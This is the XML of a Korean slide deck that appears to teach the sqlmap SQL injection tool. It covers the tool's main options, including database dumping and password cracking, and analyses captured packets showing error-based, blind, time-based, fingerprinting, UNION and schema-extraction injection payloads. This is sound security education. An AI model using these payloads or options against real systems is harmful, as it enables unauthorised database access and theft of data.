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FB70F-4FA2-9145-18DF-5474D2594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B72C2D-D748-0403-B83B-24A823ED6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7ACA03-DFCC-6B1B-44DF-55CADB44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66325-09D7-6405-1AEA-F1154076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81DE6-98C5-0512-BABC-D1AC9999C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67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AE93D-8CAF-77DA-6A2C-DC350187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676C76-A5DA-A193-4619-2E10A4A5B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ADDC6C-8DED-AA23-1014-9415E7ED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48D7D-02BA-9CC5-8CA2-35467584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17549B-947A-6F20-1884-852C5889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62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89289-806B-908E-B5D9-79F7C25F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80121-E411-FD46-7CCC-86D582BCA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758B56-419D-99A3-85C4-2182AB1BE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C63A8E-79FA-9AF7-C709-6750DBB9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CFE1CC-2F45-1791-7BFD-5F6D9EB7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52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7638B-9133-791F-1B74-FBFF5629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8144DC-FBB5-BE1A-1CCA-669D37360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E761C6-B7A4-3C9C-E830-DB7DAE2DD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425DCE-D192-216B-9793-A7301EDC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C07B66-361E-0D0E-A49F-E99217E8B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4AFB21-7A57-15DC-3BC4-0C7F8BA7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75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913FD-1BCC-0D0F-92D7-1D40DBD2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A56C9B-C610-51DC-4F36-21CBF158A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02EBFD-DDE0-0F33-EB3E-F0EC6AA4E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707482-26F4-784F-332F-B8A335A97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9E1FF3-091E-BE73-40A6-8A2B0F4DC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88AA88-4FDF-9879-ECA9-A3091E4C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899F7C-A78B-8BA6-0D46-DDFEE21C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CEEC5F-0061-6343-5208-65868C88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61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A2FB2-244B-1429-848B-401DB1A0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44E005-3A8E-3756-EA69-D03BF176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C7E690-E08F-C452-090B-212660A3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C7A226-AE76-E5EB-1C1D-48EB52FD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87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B8F6DF-452A-7AB6-18BD-A376A0FA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7611E9-6F53-34FF-0B11-8663C4419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E5F042-2DCA-9EE5-2F20-6D51BEA9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24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6B460-2347-EAF3-3639-2CAF39BD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685218-BB07-55D3-D42B-2AB949FD1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B5383B-03B5-6BDA-102E-85E2A4997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1D0A6D-6D6D-4354-83DD-5CFE75F7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31D78D-9F84-04E9-555F-9C382764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FD18EF-B260-81E2-8411-41C98776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F245C-01B1-76DC-3983-B25D7F7E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0CBF4B-D647-7EA3-D564-12EB1C9EF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8CA293-2240-2D91-7E3B-D2B8EE59D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B970D4-8807-BD0C-D6C7-A0F2F5DD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5B57E8-C377-662D-D390-7C2DF9357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EC869E-9B83-0904-82FF-0CDA7D97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0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D31A-7274-72EE-DD17-D66E84FE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6D7389-4B6C-8219-D9F0-2C12B305F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1A869-7D70-5EC5-FDAB-07AFE08F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1F3D4-8EAB-7BB7-3712-72D35F753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FA851E-6C5C-113D-6B8B-91A3F440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2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CBCBB5-5E3B-1FA5-550F-161C20092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2F45FA-03A7-DC45-C976-76EFFB799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96369A-4FA8-62BB-791A-A070DFE2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4E614-DE05-67A0-AB7F-E6A6B848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2BCB8A-5B78-BED2-E005-6E901599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45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EA9507-7662-08E2-9BD0-5837819D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4EAC69-74C4-556F-BEF4-DC83D6408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E29C1-723E-07D0-15DE-617D3EF8D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5413-D59D-4C71-AA5B-8A6EFFEEAFAC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6AA9CD-9E64-0D4D-90F0-1075BA0AA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634770-2149-6313-76DC-386A26F46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1FDC1-E645-4BDC-9A76-EC65848A8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84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qlmap.or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54D24-4773-DA66-8557-464AB7004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 err="1"/>
              <a:t>sqlmap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203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72EF0-A991-5B3F-E0D6-DE4ED34B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64CC00-06D5-5990-A268-C0261AABD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 err="1"/>
              <a:t>Sqlmap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Sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>주요옵션 및 사용법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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 실습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패킷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4664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C177E-0031-47A1-2560-64997311B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Sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의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BE78C-67D6-E128-AF12-CCB190346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 err="1"/>
              <a:t>Sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>은 </a:t>
            </a:r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  <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 취약한지 여부를 확인해주는 취약점 점검 도구이다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여러 기법의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 시행하여 점검한다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Blind Based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - Time Based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - Error Based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - Union </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>등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* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>다양한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DBMS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서 점검을 할 수 있도록 개발되었다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. *</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="69468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F4E1B-B42A-218E-A9D1-E1F5810F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Sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 주요옵션 및 사용법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183B6FE-43E0-4DED-A6D1-12F994590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923412"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838199" y="1992282"/>
          <a:ext cx="10172308" cy="41802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7558">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3202068500"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6664750">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="75406166"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="442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897261"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="442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-u “[URL]”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취약점 점검을 시행할 위치를 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>URL</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t>로 지정하는 옵션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282836"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="442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r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
                        <a:t>dbs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목록을 조회하는 옵션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811836"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="442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-cookie=“key=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
                        <a:t>value;key</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>=value;”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쿠키값을</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t> 지정해주는 옵션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필요 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>== </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t>쿠키 값 필요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355474"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="442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-D [DB</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t>이름</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>] --tables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지정한 </a:t>
                      </a:r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안에 있는 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>table </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t>목록 조회 옵션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103497"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4425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-T [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테이블 이름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--columns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지정한 테이블 안에 있는 모든 열의 이름을 조회하는 옵션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725814"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="44252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-T [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테이블 이름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--dump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안에 있는 모든 데이터를 조회 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                        <a:t>(+ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                        <a:t>비밀번호 크랙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972947"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4425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실행 시 여러 가지 사항을 물어보는데 그냥 선택하지 않고 기본 값으로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점검하는 옵션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12956"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4425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--flush-session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캐시를 모두 지우고 공격을 처음부터 다시하는 옵션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557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B08930-0131-F4D0-6DC9-907F8437DF38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="744718" y="162624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주요 옵션들</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5190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8B11F-2C90-07B5-0A81-7D02D2E2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Sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 주요옵션 및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A7FD62-7968-520F-D295-0F3E0CBCC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787"/>
            <a:ext cx="10515600" cy="5593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err="1"/>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> -u “[URL]” [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>옵션 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>1] [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>옵션 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>2]…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949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D17F6-75DA-120A-682B-ECAA4B32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실습 진행</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="373792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5C18C-82D1-57E6-5A0C-E81E4CFC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패킷 분석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sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3200" dirty="0"/>
              <a:t>DB </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>목록을 알아냈을 때를 가정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62588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A7683-19E3-97C0-BF27-A6623F3C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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Error Based)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3F093-69CA-A020-2BDA-2B1602969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err="1"/>
              <a:t>입력값을</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 다음과 같이 넣는 패킷 발견</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1(,(".).,.’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1'TcvUfj&lt;'"&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>LIdVFk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SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격이 가능한지 검사하는 과정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에러 발생 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 대해 취약하다는 것을 의미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521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96F23-E002-5B1D-4E10-CC2CE1AC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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Blind Based)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B1D1A9-4A6E-FB66-523C-BC831C696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- 1) AND 6716=3204 AND (8992=8992</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1) AND 9951=9951 AND (5049=5049</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1 AND 2098=7402</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1 AND 9951=9951</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> - 1 AND 5708=1289 -- NAIQ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참</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>거짓을 반환하게 하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점 확인</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1674178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5B327-0A71-4B6B-0AAC-FF49BC7B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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Time Based)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D6E21-AD18-2A29-2C75-1FD37A73F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1';(SELECT * FROM (SELECT(SLEEP(5)))</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>CgsO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>) AND '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>lKSA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>lKSA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SLEEP(5) : 5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>초 동안 아무것도 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>하지말고</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 대기하라는 의미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대기 시간이 길어진다면 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 취약하다는 사실을 알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0612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DCD1C-37F2-9F9D-E09E-D254741D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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Finger Print)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FAF44-EBA5-C398-B3C6-4F2C6C795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1' AND (SELECT '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>nWkl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>' FROM RDB$DATABASE)='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>nWkl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>' AND '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>IdrF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>IdrF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RDB$DATABASE : Firebird</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>라는 데이터베이스에만 존재하는 시스템 테이블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위 작업을 통해서 정상 값을 반환할 시 해당 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>DBMS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Firebird</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>임을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73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10442-3680-3F66-16A9-1926A00A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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Union)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63053-9401-608F-1D5B-45C62BD1B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1' UNION ALL SELECT CONCAT(0x716b7a6b71,0x7856506c684c5171696a5964586e654f4f624850554c4d785a4a54756270776c496c766b4c4f5557,0x7171707871),NULL-- -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특정 값을 반환하는지 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>확인함으로서</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Union Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점 여부를 확인하기 위한 작업</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1659711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BE8BB-4B63-F711-780E-CCB1CA48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패킷 분석 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(DB </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이름 알아내기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3B4078-91BF-CB98-EADF-4B31D1DF1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1' AND </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ORD(MID((SELECT DISTINCT(IFNULL(CAST(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>schema_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),10,1))&gt;104 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>AND '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>YxwH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>YxwH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Information_schema.schemata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>테이블에서 스키마 이름</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(DB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이름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번째 값 조회 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>특정한 순서의 문자 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>개 가져온다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> -&gt; ASCII </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>숫자로 만든다 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>그 값을 사용해서 특정 숫자보다 위에 있는지 확인한다 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>개를 알아낸다 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>위에 있는 작업 반복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30840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C15D7-52E5-E143-307D-132A5AED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자세한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19D8-7FD1-EDAF-A3B8-1842F0BC0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hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://sqlmap.org/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>  (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 공식 사이트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0359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9677E-60E3-CDF9-21FE-98F350BC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5557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545</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>78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sqlmap</vt:lpstr>
      <vt:lpstr>목차</vt:lpstr>
      <vt:lpstr>Sqlmap의 정의</vt:lpstr>
      <vt:lpstr>2. Sqlmap 주요옵션 및 사용법</vt:lpstr>
      <vt:lpstr>2. Sqlmap 주요옵션 및 사용법</vt:lpstr>
      <vt:lpstr>실습 진행</vt:lpstr>
      <vt:lpstr>패킷 분석 (sqlmap으로 DB 목록을 알아냈을 때를 가정)</vt:lpstr>
      <vt:lpstr>패킷 분석 (Error Based)</vt:lpstr>
      <vt:lpstr>패킷 분석 (Blind Based)</vt:lpstr>
      <vt:lpstr>패킷 분석 (Time Based) </vt:lpstr>
      <vt:lpstr>패킷 분석 (Finger Print)</vt:lpstr>
      <vt:lpstr>패킷 분석 (Union)</vt:lpstr>
      <vt:lpstr>패킷 분석 (DB 이름 알아내기)</vt:lpstr>
      <vt:lpstr>자세한 내용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6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-20T10:22:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-21T14:48:12Z</dcterms:modified>
</cp:coreProperties>
</file>